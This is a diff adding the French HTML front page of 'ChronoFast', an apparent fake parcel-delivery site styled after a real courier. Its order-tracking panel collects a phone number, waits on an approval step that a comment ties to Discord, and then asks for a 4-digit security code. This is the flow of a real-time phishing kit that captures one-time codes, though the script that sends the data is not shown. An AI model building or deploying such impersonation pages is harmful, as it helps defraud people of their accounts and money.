@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ChronoFast — Livraison express</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- ════════════════ BARRE SUPÉRIEURE ════════════════ -->
+<div class="topbar">
+    <div class="wrap topbar-inner">
+        <a href="#" class="logo">
+            <svg class="logo-svg" viewBox="0 0 36 36" fill="none">
+                <rect width="36" height="36" rx="5" fill="#009ee0"/>
+                <path d="M10 10h16l2 6H8l2-6z" fill="white" opacity=".9"/>
+                <path d="M8 16l1.5 10h17L28 16H8z" fill="white"/>
+                <circle cx="13" cy="28" r="2.5" fill="#009ee0"/>
+                <circle cx="23" cy="28" r="2.5" fill="#009ee0"/>
+            </svg>
+            <span>ChronoFast</span>
+        </a>
+        <nav class="topbar-nav">
+            <a href="#">Particulier</a><span class="pipe">|</span>
+            <a href="#">Professionnel</a><span class="pipe">|</span>
+            <a href="#">Nous contacter</a><span class="pipe">|</span>
+            <a href="#" class="lang active">FR</a><span class="slash">/</span><a href="#" class="lang">EN</a><span class="pipe">|</span>
+            <a href="#">Se connecter</a>
+        </nav>
+    </div>
+</div>
+
+<!-- ════════════════ NAVIGATION PRINCIPALE ════════════════ -->
+<nav class="mainnav">
+    <div class="wrap mainnav-inner">
+        <a href="#">Envoi</a>
+        <a href="#">Suivi</a>
+        <a href="#">Nos offres</a>
+        <a href="#">Aide / FAQ</a>
+        <a href="#">À propos de ChronoFast</a>
+        <a href="#" class="nav-active">Mon espace</a>
+        <div class="nav-search">
+            <svg viewBox="0 0 20 20" fill="currentColor">
+                <path fill-rule="evenodd" d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clip-rule="evenodd"/>
+            </svg>
+            <input type="text" placeholder="Rechercher sur le site">
+        </div>
+    </div>
+</nav>
+
+<!-- ════════════════ CONTENU PRINCIPAL ════════════════ -->
+<div class="layout-wrap">
+    <div class="wrap layout">
+
+        <!-- ── HERO (gauche) ── -->
+        <div class="hero">
+            <!-- Éléments décoratifs CSS -->
+            <div class="hero-deco hero-deco-1"></div>
+            <div class="hero-deco hero-deco-2"></div>
+            <div class="hero-deco hero-deco-3"></div>
+
+            <!-- Illustration colis -->
+            <div class="hero-illustration" aria-hidden="true">
+                <svg viewBox="0 0 320 220" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Sol -->
+                    <ellipse cx="180" cy="200" rx="110" ry="12" fill="rgba(0,0,0,0.15)"/>
+                    <!-- Grand colis -->
+                    <rect x="90" y="80" width="130" height="110" rx="5" fill="white" fill-opacity=".18" stroke="white" stroke-opacity=".35" stroke-width="1.5"/>
+                    <line x1="155" y1="80" x2="155" y2="190" stroke="white" stroke-opacity=".2" stroke-width="1"/>
+                    <line x1="90" y1="120" x2="220" y2="120" stroke="white" stroke-opacity=".2" stroke-width="1"/>
+                    <!-- Scotch -->
+                    <path d="M140 80 L140 120" stroke="rgba(0,158,224,.5)" stroke-width="6"/>
+                    <path d="M155 80 L155 120" stroke="rgba(0,158,224,.5)" stroke-width="6"/>
+                    <!-- Petit colis -->
+                    <rect x="48" y="120" width="65" height="70" rx="4" fill="white" fill-opacity=".14" stroke="white" stroke-opacity=".3" stroke-width="1.5"/>
+                    <line x1="80" y1="120" x2="80" y2="190" stroke="white" stroke-opacity=".15" stroke-width="1"/>
+                    <path d="M72 120 L72 155" stroke="rgba(0,158,224,.4)" stroke-width="4"/>
+                    <path d="M80 120 L80 155" stroke="rgba(0,158,224,.4)" stroke-width="4"/>
+                    <!-- Flèche rapide -->
+                    <path d="M256 110 L280 110" stroke="white" stroke-opacity=".6" stroke-width="2.5" stroke-linecap="round"/>
+                    <path d="M272 103 L280 110 L272 117" stroke="white" stroke-opacity=".6" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    <path d="M244 100 L268 100" stroke="white" stroke-opacity=".35" stroke-width="2" stroke-linecap="round"/>
+                    <path d="M238 120 L262 120" stroke="white" stroke-opacity=".25" stroke-width="2" stroke-linecap="round"/>
+                </svg>
+            </div>
+
+            <!-- Contenu texte -->
+            <div class="hero-content">
+                <h1>Votre livraison,<br>rapide et fiable.</h1>
+                <p>Suivez votre commande en temps réel grâce à<br>notre système de vérification sécurisé.</p>
+                <a href="#" class="hero-link">Découvrir nos services &rsaquo;</a>
+            </div>
+
+            <!-- Flèches de navigation -->
+            <button class="hero-arrow hero-prev" aria-label="Précédent">&#8249;</button>
+            <button class="hero-arrow hero-next" aria-label="Suivant">&#8250;</button>
+
+            <!-- Indicateurs -->
+            <div class="hero-dots">
+                <span class="dot active"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+                <span class="dot"></span>
+            </div>
+        </div>
+
+        <!-- ── SIDEBAR (droite) ── -->
+        <aside class="sidebar">
+
+            <!-- Bouton CTA bleu -->
+            <button class="cta-send">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/>
+                    <circle cx="12" cy="10" r="3"/>
+                </svg>
+                Envoyer un colis
+            </button>
+
+            <!-- Panneau de suivi commande -->
+            <div class="track-panel">
+                <div class="track-header">
+                    Suivre <strong>votre commande</strong>
+                    <span class="info-circle" title="Entrez votre numéro de téléphone">&#9432;</span>
+                </div>
+
+                <!-- ─── Étape 1 : numéro de téléphone ─── -->
+                <div id="step-1" class="track-body">
+                    <div class="track-input-row">
+                        <span class="track-prefix">+33</span>
+                        <input type="tel" id="phone-input" placeholder="N° de téléphone" maxlength="10" autocomplete="tel">
+                        <button class="track-go" id="phone-submit" aria-label="Valider">
+                            <svg viewBox="0 0 20 20" fill="currentColor">
+                                <path fill-rule="evenodd" d="M10.293 5.293a1 1 0 011.414 0l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414-1.414L12.586 11H5a1 1 0 110-2h7.586l-2.293-2.293a1 1 0 010-1.414z" clip-rule="evenodd"/>
+                            </svg>
+                        </button>
+                    </div>
+                    <p class="track-note">Nous vous demanderons de vérifier votre identité.</p>
+                </div>
+
+                <!-- ─── Étape 2 : attente Discord ─── -->
+                <div id="step-2" class="track-body hidden">
+                    <div class="status-block">
+                        <div class="mini-spin"></div>
+                        <div class="status-text">
+                            <span class="status-title">Vérification en cours&hellip;</span>
+                            <span class="status-sub">Notre équipe traite votre demande.</span>
+                        </div>
+                    </div>
+                    <div class="phone-pill" id="phone-display"></div>
+                    <div class="prog-bar"><div class="prog-fill"></div></div>
+                </div>
+
+                <!-- ─── Refus ─── -->
+                <div id="step-refused" class="track-body hidden">
+                    <div class="refused-box">
+                        <div class="refused-x">&#10005;</div>
+                        <p>Votre demande a été refusée.</p>
+                        <p class="refused-sub">Contactez notre support pour plus d'informations.</p>
+                        <button class="btn-retry" onclick="resetToStart()">&#8635; Réessayer</button>
+                    </div>
+                </div>
+
+                <!-- ─── Étape 3 : code 4 chiffres ─── -->
+                <div id="step-3" class="track-body hidden">
+                    <p class="code-label">Code de sécurité à 4 chiffres :</p>
+                    <div class="code-row">
+                        <div class="code-digits">
+                            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+                            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+                            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+                            <input type="text" class="code-digit" maxlength="1" inputmode="numeric" autocomplete="off">
+                        </div>
+                        <button class="track-go" id="code-submit" disabled aria-label="Valider le code">
+                            <svg viewBox="0 0 20 20" fill="currentColor">
+                                <path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/>
+                            </svg>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- ─── Étape 4 : validation finale ─── -->
+                <div id="step-4" class="track-body hidden">
+                    <div class="status-block">
+                        <div class="mini-spin"></div>
+                        <div class="status-text">
+                            <span class="status-title">Validation finale&hellip;</span>
+                            <span class="status-sub">Vous allez être redirigé.</span>
+                        </div>
+                    </div>
+                    <div class="prog-bar"><div class="prog-fill"></div></div>
+                </div>
+
+            </div><!-- /track-panel -->
+        </aside>
+
+    </div><!-- /layout -->
+</div><!-- /layout-wrap -->
+
+<!-- ════════════════ SERVICES ════════════════ -->
+<section class="services">
+    <div class="wrap">
+        <h2 class="section-title">Nos services ChronoFast</h2>
+        <div class="services-grid">
+            <div class="service-card">
+                <div class="service-top">
+                    <div class="service-icon">🚀</div>
+                    <h3>Livraison express</h3>
+                </div>
+                <p>Livraison garantie en 24h partout en France métropolitaine.</p>
+                <a href="#">En savoir plus &rsaquo;</a>
+            </div>
+            <div class="service-card">
+                <div class="service-top">
+                    <div class="service-icon">📍</div>
+                    <h3>Suivi en temps réel</h3>
+                </div>
+                <p>Suivez l'acheminement de votre colis à chaque étape.</p>
+                <a href="#">En savoir plus &rsaquo;</a>
+            </div>
+            <div class="service-card">
+                <div class="service-top">
+                    <div class="service-icon">🏪</div>
+                    <h3>Points relais</h3>
+                </div>
+                <p>Plus de 8 000 points de dépôt et de retrait en France.</p>
+                <a href="#">En savoir plus &rsaquo;</a>
+            </div>
+            <div class="service-card">
+                <div class="service-top">
+                    <div class="service-icon">🔒</div>
+                    <h3>Livraison sécurisée</h3>
+                </div>
+                <p>Vos colis assurés et protégés jusqu'à destination.</p>
+                <a href="#">En savoir plus &rsaquo;</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ════════════════ FOOTER ════════════════ -->
+<footer>
+    <div class="wrap footer-inner">
+        <div class="footer-logo">
+            <svg viewBox="0 0 36 36" fill="none" style="width:26px;height:26px">
+                <rect width="36" height="36" rx="5" fill="rgba(255,255,255,0.2)"/>
+                <path d="M10 10h16l2 6H8l2-6z" fill="white" opacity=".9"/>
+                <path d="M8 16l1.5 10h17L28 16H8z" fill="white"/>
+                <circle cx="13" cy="28" r="2.5" fill="rgba(0,62,110,0.8)"/>
+                <circle cx="23" cy="28" r="2.5" fill="rgba(0,62,110,0.8)"/>
+            </svg>
+            ChronoFast
+        </div>
+        <nav class="footer-nav">
+            <a href="#">CGV</a>
+            <a href="#">Confidentialité</a>
+            <a href="#">Contact</a>
+            <a href="#">Mentions légales</a>
+        </nav>
+        <p class="footer-copy">&copy; 2026 ChronoFast &middot; Tous droits réservés</p>
+    </div>
+</footer>
+
+<script src="script.js"></script>
+</body>
+</html>
